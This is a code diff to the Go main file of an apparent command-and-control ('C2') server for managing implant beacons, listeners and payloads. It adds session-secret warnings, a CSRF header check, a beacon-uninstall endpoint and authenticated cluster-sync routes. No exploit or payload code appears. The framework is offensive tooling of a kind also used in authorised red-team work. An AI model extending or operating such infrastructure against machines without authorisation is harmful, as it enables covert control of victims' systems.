@@ -37,6 +37,9 @@ func main() {
 			log.Fatal("Failed to generate session secret:", err)
 		}
 		secretKey = hex.EncodeToString(b)
+		log.Println("[!] PRTS_SECRET not set: sessions do not survive restarts. Set a >=32 byte secret to keep operators logged in.")
+	} else if len(secretKey) < 32 {
+		log.Println("[!] PRTS_SECRET is shorter than 32 bytes: session cookies can be brute-forced offline. Use a longer random secret.")
 	}
 	store := cookie.NewStore([]byte(secretKey))
 	r.Use(sessions.Sessions("prts-session", store))
@@ -58,6 +61,11 @@ func main() {
 		}
 		c.Next()
 	})
+
+	// CSRF defense-in-depth for state-changing API calls: require the custom
+	// header the dashboard adds to every request. SameSite=Lax already stops
+	// cross-site form posts; this closes header-based gaps too.
+	r.Use(csrfHeaderGuard())
 
 	// Static files: protect /static/payloads/ behind auth, serve rest normally
 	r.GET("/static/*filepath", func(c *gin.Context) {
@@ -109,6 +117,7 @@ func main() {
 			auth.PUT("/clients/:id", handleUpdateClientNote)
 			auth.DELETE("/clients/:id", handleDeleteClient)
 			auth.POST("/clients/:id/kill", handleKillBeacon)
+			auth.POST("/clients/:id/uninstall", handleUninstallBeacon)
 
 			// Listener routes
 			auth.GET("/listeners", handleGetListeners)
@@ -169,15 +178,62 @@ func main() {
 			// Callback filter routes
 			auth.GET("/filters", handleGetFilters)
 			auth.POST("/filters", handleUpdateFilters)
+
+			// Cluster routes (operator)
+			auth.GET("/cluster/status", handleClusterStatus)
+			auth.POST("/cluster/invite", handleClusterInvite)
+			auth.POST("/cluster/join", handleClusterJoinOperator)
+			auth.POST("/cluster/node-url", handleClusterSetURL)
+			auth.DELETE("/cluster/nodes/:id", handleClusterRemoveNode)
+		}
+	}
+
+	// Internal cluster API (peer-to-peer, HMAC authenticated with pair tokens)
+	clusterAPI := r.Group("/cluster")
+	{
+		clusterAPI.POST("/join", handleClusterJoin)
+		authed := clusterAPI.Group("/")
+		authed.Use(clusterAuthRequired())
+		{
+			authed.POST("/heartbeat", handleClusterHeartbeat)
+			authed.POST("/events", handleClusterEvents)
+			authed.GET("/snapshot", handleClusterSnapshot)
+			authed.POST("/kicked", handleClusterKicked)
 		}
 	}
 
 	// WebSocket (requires authentication)
 	r.GET("/ws", AuthRequired(), handleWS)
 
+	// Cluster sync workers
+	clusterInit()
+
 	addr := envOrDefault("PRTS_ADDR", ":8083")
 	fmt.Printf("[+] PRTSTRIKE C2 SERVER (GIN) STARTED ON %s\n", addr)
 	log.Fatal(r.Run(addr))
+}
+
+// csrfHeaderGuard rejects state-changing /api requests that lack the custom
+// header set by the dashboard JavaScript. Login is exempt (pre-auth).
+func csrfHeaderGuard() gin.HandlerFunc {
+	return func(c *gin.Context) {
+		switch c.Request.Method {
+		case http.MethodPost, http.MethodPut, http.MethodDelete, http.MethodPatch:
+		default:
+			c.Next()
+			return
+		}
+		path := c.Request.URL.Path
+		if path == "/api/login" || !strings.HasPrefix(path, "/api/") || strings.HasPrefix(path, "/cluster/") {
+			c.Next()
+			return
+		}
+		if c.GetHeader("X-Requested-With") != "XMLHttpRequest" {
+			c.AbortWithStatusJSON(http.StatusForbidden, APIResponse{Status: "error", Message: "CSRF_HEADER_REQUIRED"})
+			return
+		}
+		c.Next()
+	}
 }
 
 // staticFilePath resolves a wildcard URL path under ./static without allowing
